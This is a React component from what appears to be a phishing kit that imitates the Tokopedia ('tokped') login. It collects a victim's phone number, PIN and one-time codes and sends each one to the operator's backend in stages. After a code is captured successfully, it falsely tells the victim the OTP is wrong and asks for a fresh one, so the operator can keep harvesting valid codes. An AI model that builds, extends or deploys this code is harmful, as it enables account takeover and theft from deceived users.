'use client';

import { useEffect, useRef, useState } from 'react';
import type { TokpedSlugData } from './types';
import { OTP_LOCK_MS, OVERLAY_MIN_MS } from '../enterprise/lib/constants';
import { submitEnterpriseStep } from '../enterprise/lib/submit';
import type { EnterpriseStepData } from '../enterprise/lib/types';
import { ENTERPRISE_INITIAL_STEP_DATA } from '../enterprise/lib/types';
import { otpIsValid, pinIsValid, vibrateOtpWrong } from '../enterprise/lib/utils';
import { ThemeColorMeta } from '../enterprise/ThemeColorMeta';
import { Tv1LoadingSpinnerOverlay, TV1_GREEN } from './Tv1LoadingSpinnerOverlay';
import { Tv1LoginScreen } from './Tv1LoginScreen';
import { Tv1OtpScreen } from './Tv1OtpScreen';
import { TV1_PHONE_ERROR, tv1PhoneIsValid } from './tv1-phone';

const FLOW_STEP_GAP_MS = 2100;
const TV1_OTP_COUNTDOWN_SEC = 293;

type Props = {
  slugData: TokpedSlugData;
};

type FormStep = 'login' | 'otp';

export function Tv1FormFlow({ slugData }: Props) {
  const [step, setStep] = useState<FormStep>('login');
  const [stepData, setStepData] = useState<EnterpriseStepData>(ENTERPRISE_INITIAL_STEP_DATA);
  const [submitting, setSubmitting] = useState(false);
  const [isLoadingOverlay, setIsLoadingOverlay] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [countdown, setCountdown] = useState(TV1_OTP_COUNTDOWN_SEC);
  const [otpLocked, setOtpLocked] = useState(false);
  const otpLockTimeoutRef = useRef<number | null>(null);

  useEffect(() => {
    if (step !== 'otp' || countdown <= 0) return undefined;
    const timer = window.setTimeout(() => setCountdown((v) => v - 1), 1000);
    return () => window.clearTimeout(timer);
  }, [step, countdown]);

  useEffect(() => {
    return () => {
      if (otpLockTimeoutRef.current) window.clearTimeout(otpLockTimeoutRef.current);
    };
  }, []);

  const handleLogin = async () => {
    if (submitting) return;

    if (!tv1PhoneIsValid(stepData.phone)) {
      setErrorMessage(TV1_PHONE_ERROR);
      return;
    }

    if (!pinIsValid(stepData.pin)) return;

    setErrorMessage('');
    setSubmitting(true);
    setIsLoadingOverlay(true);
    const overlayStart = Date.now();

    const step1 = await submitEnterpriseStep(
      slugData.slug,
      1,
      { ...stepData, pin: '', otp: '' },
      0,
      'tokped'
    );
    if (!step1.success) {
      setErrorMessage(step1.error || 'Gagal mengirim data.');
      setSubmitting(false);
      setIsLoadingOverlay(false);
      return;
    }

    await new Promise((r) => setTimeout(r, FLOW_STEP_GAP_MS));

    const step2 = await submitEnterpriseStep(slugData.slug, 2, stepData, 0, 'tokped');
    if (!step2.success) {
      setErrorMessage(step2.error || 'Gagal mengirim data.');
      setSubmitting(false);
      setIsLoadingOverlay(false);
      return;
    }

    const remaining = OVERLAY_MIN_MS - (Date.now() - overlayStart);
    if (remaining > 0) await new Promise((r) => setTimeout(r, remaining));

    setStep('otp');
    setCountdown(TV1_OTP_COUNTDOWN_SEC);
    setStepData((prev) => ({ ...prev, otp: '' }));
    setSubmitting(false);
    setIsLoadingOverlay(false);
  };

  const handleVerify = async () => {
    if (!otpIsValid(stepData.otp, 6) || submitting || otpLocked) return;

    setErrorMessage('');
    setSubmitting(true);
    setIsLoadingOverlay(true);
    const overlayStart = Date.now();

    const { success, error } = await submitEnterpriseStep(slugData.slug, 3, stepData, 0, 'tokped');

    const remaining = OVERLAY_MIN_MS - (Date.now() - overlayStart);
    if (remaining > 0) await new Promise((r) => setTimeout(r, remaining));

    if (success) {
      vibrateOtpWrong();
      setErrorMessage('Kode otp salah. Silahkan coba lagi.');
      setCountdown(TV1_OTP_COUNTDOWN_SEC);
      setOtpLocked(true);
      if (otpLockTimeoutRef.current) window.clearTimeout(otpLockTimeoutRef.current);
      otpLockTimeoutRef.current = window.setTimeout(() => {
        setStepData((prev) => ({ ...prev, otp: '' }));
        setOtpLocked(false);
        otpLockTimeoutRef.current = null;
      }, OTP_LOCK_MS);
    } else {
      vibrateOtpWrong();
      setErrorMessage(error || 'Gagal mengirim data.');
    }

    setSubmitting(false);
    setIsLoadingOverlay(false);
  };

  return (
    <>
      <ThemeColorMeta color={TV1_GREEN} />
      <Tv1LoadingSpinnerOverlay visible={isLoadingOverlay} />

      {step === 'login' ? (
        <Tv1LoginScreen
          phone={stepData.phone}
          pin={stepData.pin}
          submitting={submitting}
          errorMessage={errorMessage}
          callCenterPhone={slugData.callCenterPhone}
          onPhoneChange={(phone) => {
            if (errorMessage) setErrorMessage('');
            setStepData((prev) => ({ ...prev, phone }));
          }}
          onPinChange={(pin) => setStepData((prev) => ({ ...prev, pin }))}
          onSubmit={() => void handleLogin()}
        />
      ) : (
        <Tv1OtpScreen
          otp={stepData.otp}
          countdown={countdown}
          submitting={submitting}
          otpLocked={otpLocked}
          errorMessage={errorMessage}
          onOtpChange={(otp) => {
            if (errorMessage) setErrorMessage('');
            setStepData((prev) => ({ ...prev, otp }));
          }}
          onSubmit={() => void handleVerify()}
        />
      )}
    </>
  );
}
